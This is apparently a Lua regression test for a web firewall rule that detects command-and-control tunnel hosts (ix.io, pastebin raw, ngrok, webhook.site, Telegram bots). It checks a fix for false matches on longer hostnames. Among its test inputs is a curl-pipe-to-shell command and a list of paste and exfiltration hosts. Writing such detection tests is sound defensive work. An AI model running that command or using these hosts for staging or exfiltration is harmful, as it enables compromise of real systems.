-- Tests for the C2-tunnel host-list left-boundary anchoring (audit F36, rule
-- 702 WAF_C2:TUNNEL, production tier: challenge).
--
-- detect_c2_tunnel matched host tokens with a plain substring, so the short
-- token "ix.io/" matched any longer hostname ending in it — "matrix.io/",
-- "phoenix.io/" — tagging benign traffic as C2. The rule is at challenge, so
-- those were real user-facing false positives. Fix: anchor each token on a
-- `%f[%w]` left host boundary (kept behind the cheap has() precheck).
--
-- Tested at "block" for a crisp hit=true assertion; production tier unchanged.

_G.ngx = {
  now           = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

local function set_only(map)
  local snap = waf.get_config()
  for k, _ in pairs(snap) do
    if k:sub(1, 5) == "rule_" then waf.set_rule(k, "disabled") end
  end
  for k, m in pairs(map) do waf.set_rule(k, m) end
end

-- Payload in the query string (always scanned; avoids body-read gating).
local function q(qs)
  return { uri = "/", args = qs, method = "GET", ip = "203.0.113.95", headers = {}, body = "" }
end

local function fires(ctx, label, want_reason)
  local hit, reason = waf.check(ctx)
  check(hit == true, label .. " — hit=true (got " .. tostring(hit) .. ")")
  check(reason == want_reason, label .. " — reason=" .. want_reason .. " (got " .. tostring(reason) .. ")")
end
local function clean(ctx, label)
  local hit = waf.check(ctx)
  check(hit ~= true, label .. " — must NOT fire (got hit=" .. tostring(hit) .. ")")
end

set_only({ rule_c2_tunnel = "block" })

-- ── F36: longer hostnames ending in a short token no longer false-match ──────
clean(q("u=https://matrix.io/_matrix/client/r0/sync"), "matrix.io/ (was C2:IX_IO)")
clean(q("u=https://phoenix.io/download"),              "phoenix.io/ (was C2:IX_IO)")
clean(q("u=http://citrix.io/vpn"),                     "citrix.io/ (was C2:IX_IO)")
clean(q("u=http://X0x0.st/aa"),                        "X0x0.st/ (prefix of 0x0.st)")

-- ── Regressions: real C2 hosts still fire at a proper boundary ──────────────
fires(q("u=http://ix.io/ABCD"),                     "real ix.io/ (scheme //)",  "WAF_C2:TUNNEL:IX_IO")
fires(q("cmd=curl ix.io/xY|sh"),                    "real ix.io/ (space before)", "WAF_C2:TUNNEL:IX_IO")
fires(q("u=http://p.ix.io/ABCD"),                   "ix.io subdomain",          "WAF_C2:TUNNEL:IX_IO")
fires(q("u=https://pastebin.com/raw/abcd"),         "pastebin.com/raw/",        "WAF_C2:TUNNEL:PASTEBIN_RAW")
fires(q("u=https://x.ngrok-free.app/p"),            "ngrok-free.app/ (hyphen)", "WAF_C2:TUNNEL:NGROK")
fires(q("u=http://0x0.st/aa.sh"),                   "0x0.st/ (digit lead)",     "WAF_C2:TUNNEL:0X0_ST")
fires(q("u=https://raw.githubusercontent.com/a/b"), "raw.githubusercontent.com/", "WAF_C2:TUNNEL:GITHUB_RAW")
fires(q("u=https://webhook.site/abc-123"),          "webhook.site/",            "WAF_C2:TUNNEL:WEBHOOK_SITE")
-- Structurally-unusual tokens: no trailing '/' + many escaped dots, and a deep
-- path token — lock their dot-escaping and left boundary.
fires(q("s=api.telegram.org/bot123:AA/sendMessage"), "telegram bot (no trailing /, multi-dot)", "WAF_C2:TUNNEL:TELEGRAM_BOT")
fires(q("u=https://cdn.discordapp.com/attachments/1/2/x.exe"), "discord CDN /attachments/", "WAF_C2:TUNNEL:DISCORD_CDN")

-- ── Clean ────────────────────────────────────────────────────────────────────
clean(q("u=https://example.com/page"),  "benign host, no C2 token")
clean(q("q=how to use pastebin"),        "prose mentioning pastebin, no raw/ path")

if fails > 0 then
  io.stderr:write(("cfm_waf C2 boundary tests: %d FAILED\n"):format(fails))
  os.exit(1)
end
print("ok: cfm_waf C2-tunnel host left-boundary anchoring (F36, rule 702)")
